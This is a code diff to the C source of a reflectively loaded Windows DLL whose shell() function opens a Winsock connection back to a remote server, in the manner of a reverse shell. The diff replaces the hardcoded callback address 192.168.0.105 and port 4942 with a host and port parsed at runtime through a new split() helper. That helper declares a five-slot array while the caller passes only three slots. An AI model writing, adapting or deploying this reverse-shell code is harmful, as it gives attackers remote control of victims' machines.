@@ -3,6 +3,7 @@
 //===============================================================================================//
 
 #include "ReflectiveLoader.h"
+#include "FileTunnel.h"
 #include <stdio.h>
 #include <string.h>
 #include <winsock2.h>
@@ -10,6 +11,20 @@
 
 extern HINSTANCE hAppInstance;
 //===============================================================================================//
+
+void split(char* src, char* dest[5], const char* delimeter) {
+    // Only split if delimeter does exist in the source string
+    if (strstr(src, delimeter) != NULL)
+    {
+        int i = 0;
+        char* p = strtok(src, delimeter);
+        while (p != NULL)
+        {
+            dest[i++] = p;
+            p = strtok(NULL, delimeter);
+        }
+    }
+}
 
 DWORD WINAPI shell()
 {
@@ -39,10 +54,12 @@ DWORD WINAPI shell()
             return 1;
         }
 
+        char* values[3];
+        split(GetInputOutput(), values, ":");
         memset(&server, 0, sizeof(server));
         server.sin_family = AF_INET;
-        server.sin_port = htons(4942);
-        server.sin_addr.s_addr = inet_addr("192.168.0.105");
+        server.sin_port = htons(atoi(values[1]));
+        server.sin_addr.s_addr = inet_addr(values[0]);
 
         res = WSAConnect(sock, (struct sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL);
         if (res == SOCKET_ERROR)
